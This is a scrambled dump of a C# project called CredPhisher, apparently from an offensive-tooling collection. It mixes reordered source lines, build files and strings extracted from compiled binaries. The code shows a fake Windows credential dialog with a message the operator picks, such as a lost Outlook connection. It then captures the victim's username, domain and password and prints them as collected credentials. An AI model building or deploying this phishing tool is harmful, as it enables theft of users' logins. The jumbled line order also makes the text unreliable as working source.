@@ -1,0 +1,403 @@
+            
+                        Domain = domainBuf.ToString()
+                    CoTaskMemFree(outCredBuffer)
+                    networkCredential = new NetworkCredential()
+                    return
+                    {
+                    }
+                1)
+                return
+                {
+                }
+            //This block collects the current username and prompts them. This is easily modifiable.
+            CREDUI_INFO credui = new CREDUI_INFO()
+            IntPtr outCredBuffer = new IntPtr()
+            bool save = false
+            catch (Exception)
+            catch (NullReferenceException) 
+            credui.cbSize = Marshal.SizeOf(credui)
+            credui.pszCaptionText = message
+            if (args.Length == 0){
+            if (result == 0)
+            int flags)
+            int maxDomain = 256
+            int maxPassword = 128
+            int maxUserName = 256
+            networkCredential = null
+            public IntPtr hbmBanner
+            public IntPtr hwndParent
+            public int cbSize
+            public string pszCaptionText
+            public string pszMessageText
+            ref int pcchMaxPassword)
+            string username = System.Security.Principal.WindowsIdentity.GetCurrent().Name
+            try
+            uint authPackage = 0
+            uint outCredSize
+            var domainBuf = new StringBuilder(128)
+            var passwordBuf = new StringBuilder(256)
+            var usernameBuf = new StringBuilder(256)
+            {
+            }
+        private struct CREDUI_INFO
+        public static extern void CoTaskMemFree(IntPtr ptr)
+        static void Main(string[] args)
+        {
+        }
+      </requestedPrivileges>
+    </security>
+    <AssemblyName>CredPhisher</AssemblyName>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <DefineConstants>DEBUG
+    <ErrorReport>prompt</ErrorReport>
+    <ExternalConsole>true</ExternalConsole>
+    <IntermediateOutputPath>obj
+    <Optimize>false</Optimize>
+    <Optimize>true</Optimize>
+    <OutputPath>bin
+    <OutputType>Exe</OutputType>
+    <PostBuildEvent>mkdir  $(SolutionDir)
+    <Prefer32Bit>false</Prefer32Bit>
+    <ProjectGuid>{A9386992-CFAC-468A-BD41-78382212E5B9}</ProjectGuid>
+    <RootNamespace>CredPhisher</RootNamespace>
+    <TargetFrameworkProfile />
+    <TargetFrameworkVersion>v4.8</TargetFrameworkVersion>
+    <WarningLevel>4</WarningLevel>
+    <security>
+    class MainClass
+    {
+    }
+  </ItemGroup>
+  </PropertyGroup>
+  </trustInfo>
+  <ItemGroup>
+  <PropertyGroup>
+ MSF 7.00
+ networkCredential.Domain 
+ networkCredential.Password)
+ networkCredential.UserName 
+ username
+"                        Password = passwordBuf.ToString(),"
+"                        UserName = usernameBuf.ToString(),"
+"                    ""Password: "" "
+"                    ""Username: "" "
+"                    domainBuf, ref maxDomain, passwordBuf, ref maxPassword))"
+"                0,"
+"                Collector(args[0], out NetworkCredential networkCredential)"
+"                Console.WriteLine(""["
+"                Console.WriteLine(""[-] Looks like something went wrong..."")"
+"                Console.WriteLine(""[-] Please supply the message that will be displayed to the target (ex. 'Windows has lost connection to Outlook')"")"
+"                Console.WriteLine(""[-] User exited prompt"")"
+"                IntPtr.Zero,"
+"                if (CredUnPackAuthenticationBuffer(0, outCredBuffer, outCredSize, usernameBuf, ref maxUserName,"
+"                out outCredBuffer,"
+"                out outCredSize,"
+"                ref authPackage,"
+"                ref save,"
+"            IntPtr InAuthBuffer,"
+"            IntPtr pAuthBuffer,"
+"            StringBuilder pszDomainName,"
+"            StringBuilder pszPassword,"
+"            StringBuilder pszUserName,"
+"            credui.pszMessageText = ""Please enter the credentials for "" "
+"            int authError,"
+"            int result = CredUIPromptForWindowsCredentials(ref credui,"
+"            out IntPtr refOutAuthBuffer,"
+"            out uint refOutAuthBufferSize,"
+"            ref bool fSave,"
+"            ref int pcchMaxDomainame,"
+"            ref int pcchMaxUserName,"
+"            ref uint authPackage,"
+"            uint InAuthBufferSize,"
+"            uint cbAuthBuffer,"
+"        <requestedExecutionLevel level=""asInvoker"" uiAccess=""false""/>"
+"        [DllImport(""credui.dll"", CharSet = CharSet.Auto)]"
+"        [DllImport(""ole32.dll"")]"
+"        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]"
+"        private static extern bool CredUnPackAuthenticationBuffer(int dwFlags,"
+"        private static extern int CredUIPromptForWindowsCredentials(ref CREDUI_INFO notUsedHere,"
+"        public static void Collector(string message, out NetworkCredential networkCredential)"
+"      <requestedPrivileges xmlns=""urn:schemas-microsoft-com:asm.v3"">"
+"    <Compile Include=""Program.cs"" />"
+"    <Compile Include=""Properties"
+"    <Configuration Condition="" '$(Configuration)' == '' "">Debug</Configuration>"
+"    <None Include=""app.config"" />"
+"    <Platform Condition="" '$(Platform)' == '' "">anycpu</Platform>"
+"    <Reference Include=""System"" />"
+"  <Import Project=""$(MSBuildBinPath)"
+"  <PropertyGroup Condition="" '$(Configuration)"
+"  <assemblyIdentity version=""1.0.0.0"" name=""MyApplication.app""/>"
+"  <trustInfo xmlns=""urn:schemas-microsoft-com:asm.v2"">"
+""" will automatically update the build and revision,"
+""" will update just the revision."
+".NETFramework,Version=v4.8"
+".NETFramework,Version=v4.8.AssemblyAttributes.cs"
+".NETFramework,v4.8,AssemblyFoldersEx}"
+".netframework,version=v4.8.assemblyattributes.cs"
+"// The assembly version has the format ""{Major}.{Minor}.{Build}.{Revision}""."
+"// The following attributes are used to specify the signing key for the assembly, "
+"// The form ""{Major}.{Minor}."
+"// and ""{Major}.{Minor}.{Build}."
+"//[assembly: AssemblyKeyFile("""")]"
+"2[[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.Collections.Generic.List"
+"2[[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]"
+"2[[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]"
+"2[[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]][]"
+"<Project DefaultTargets=""Build"" ToolsVersion=""12.0"" xmlns=""http://schemas.microsoft.com/developer/msbuild/2003"">"
+"<assembly xmlns=""urn:schemas-microsoft-com:asm.v1"" manifestVersion=""1.0"">"
+"<startup><supportedRuntime version=""v4.0"" sku="".NETFramework,Version=v4.8""/></startup></configuration>"
+"AssemblyInfo.cs"" />"
+"Microsoft.CSharp.targets"" />"
+"[assembly: AssemblyCompany("""")]"
+"[assembly: AssemblyConfiguration("""")]"
+"[assembly: AssemblyCopyright(""${AuthorCopyright}"")]"
+"[assembly: AssemblyCulture("""")]"
+"[assembly: AssemblyDescription("""")]"
+"[assembly: AssemblyProduct("""")]"
+"[assembly: AssemblyTitle(""CredPhisher"")]"
+"[assembly: AssemblyTrademark("""")]"
+"[assembly: AssemblyVersion(""1.0."
+"[assembly: global::System.Runtime.Versioning.TargetFrameworkAttribute("".NETFramework,Version=v4.8"", FrameworkDisplayName = "".NET Framework 4.8"")]"
+"anycpu' "">"
+"dMicrosoft.VisualStudio.CommonIDE, Version=17.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"
+"xml version=""1.0"" encoding=""UTF-8"" standalone=""yes"""
+"xml version=""1.0"" encoding=""utf-8"""
+$(Platform)' == 'Debug
+$(Platform)' == 'Release
+$(TargetFileName)</PostBuildEvent>
+${AuthorCopyright}
+.NET Framework 4.8
+.NETFramework
+.ctor
+.dll
+.exe
+.rsrc
+.text
+.winmd
+// <autogenerated />
+// Change them to the values specific to your project.
+// Information about this assembly is defined by the following attributes. 
+// if desired. See the Mono documentation for more information about signing.
+//[assembly: AssemblyDelaySign(false)]
+/LinkInfo
+/TMCache
+/names
+/src/files/e:
+/src/headerblock
+06000004
+06000005
+1[[System.Collections.Generic.KeyValuePair
+223343bd-a859-41a3-90c0-9dfa101f1a95>
+2f8835ec66915bec9155c1ff9ae5b952f80f0b8f
+7FBDA2D2
+8Microsoft.VisualStudio.Build.ComInteropWrapper.RarInputs
+9FHmP
+</DefineConstants>
+</Project>
+</assembly>
+<DanglingDocuments
+<Module>
+<configuration>
+@.reloc
+A48CE987
+ApfB{
+Applications
+Apps_VM_Sandbox_Windows
+AssemblyCompanyAttribute
+AssemblyConfigurationAttribute
+AssemblyCopyrightAttribute
+AssemblyDescriptionAttribute
+AssemblyInfo.cs
+AssemblyProductAttribute
+AssemblyTitleAttribute
+AssemblyTrademarkAttribute
+BSJB
+BUILD
+Blob
+B{Registry:Software
+CREDUI_INFO
+ClaimsIdentity
+CoTaskMemFree
+Collector
+CompilationRelaxationsAttribute
+Concat
+Console
+CredPhisher
+CredPhisher.MainClass
+CredPhisher.csproj.CoreCompileInputs.cache
+CredPhisher.csproj.SuggestedBindingRedirects.cache
+CredPhisher.exe
+CredPhisher.exe.config
+CredPhisher.pdb
+CredUIPromptForWindowsCredentials
+CredUnPackAuthenticationBuffer
+Debug
+Debug</IntermediateOutputPath>
+Debug</OutputPath>
+DebuggableAttribute
+DebuggingModes
+DesignTimeResolveAssemblyReferences.cache
+Facades
+Framework
+FrameworkDisplayName
+Full
+GUID
+GetCurrent
+InAuthBuffer
+InAuthBufferSize
+IntPtr
+L!This program cannot be run in DOS mode.
+LsqwB
+Main
+MainClass
+Marshal
+Microsoft
+Microsoft C/C
+NetworkCredential
+NullReferenceException
+Object
+OffensiveCSharp
+Program Files (x86)
+Program.cs
+Properties
+RSDS
+Reference Assemblies
+Release</IntermediateOutputPath>
+Release</OutputPath>
+RuntimeCompatibilityAttribute
+SizeOf
+StringBuilder
+Strings
+System
+System.Collections.Generic.KeyValuePair
+System.Collections.Generic.List
+System.Core.dll
+System.Diagnostics
+System.Net
+System.Reflection
+System.Runtime.CompilerServices
+System.Runtime.InteropServices
+System.Runtime.Versioning
+System.Security.Claims
+System.Security.Principal
+System.Text
+System.dll
+TargetFrameworkAttribute
+ToString
+USystem
+USystem.Net
+USystem.Runtime.InteropServices
+USystem.Text
+ValueType
+WindowsIdentity
+WrapNonExceptionThrows
+WriteLine
+Zero
+] Collected Credentials:
+_CorExeMain
+_Entry_Point
+__SORT
+__sort
+_items
+_size
+_version
+allowedAssemblyExtensions
+anycpu
+app.config
+appConfigFile
+applications
+apps_vm_sandbox_windows
+args
+assemblyinfo.cs
+authError
+authPackage
+build
+candidateAssemblyFiles
+cbAuthBuffer
+cbSize
+copy /Y $(TargetDir)$(TargetFileName) $(SolutionDir)
+credphisher
+credui
+credui.dll
+debug
+domainBuf
+dwFlags
+eYs2Mk<
+fSave
+flags
+fullFrameworkAssemblyTables
+fullFrameworkFolders
+fullTargetFrameworkSubsetNames$ignoreDefaultInstalledAssemblyTables
+gdtarSearchPaths
+get_Domain
+get_Name
+get_Password
+get_UserName
+hbmBanner
+hwndParent
+ignoreDefaultInstalledAssemblySubsetTables
+installedAssemblySubsetTables latestTargetFrameworkDirectories
+installedAssemblyTables
+maxDomain
+maxPassword
+maxUserName
+message
+mscoree.dll
+mscorlib
+mscorlib.dll
+msil
+namespace CredPhisher
+networkCredential
+notUsedHere
+offensivecsharp
+ole32.dll
+outCredBuffer
+outCredSize
+pAuthBuffer
+passwordBuf
+pcchMaxDomainame
+pcchMaxPassword
+pcchMaxUserName
+pdtarSearchPaths
+profileName
+program.cs
+properties
+pszCaptionText
+pszDomainName
+pszMessageText
+pszPassword
+pszUserName
+qq8r
+refOutAuthBuffer
+refOutAuthBufferSize
+referencePaths
+registrySearchPath
+result
+save
+set_Domain
+set_Password
+set_UserName
+stZJ
+stateFile
+targetFrameworkDirectories
+targetFrameworkMoniker!targetFrameworkMonikerDisplayName
+targetFrameworkSubsets
+targetFrameworkVersion
+targetProcessorArchitecture
+targetedRuntimeVersion
+useReferencesFromProject
+username
+usernameBuf
+using System
+using System.Net
+using System.Reflection
+using System.Runtime.CompilerServices
+using System.Runtime.InteropServices
+using System.Text
+v4.0.30319
+v4.8
+{CandidateAssemblyFiles}
+{HintPathFromItem}
+{RawFileName}
+{TargetFrameworkDirectory}
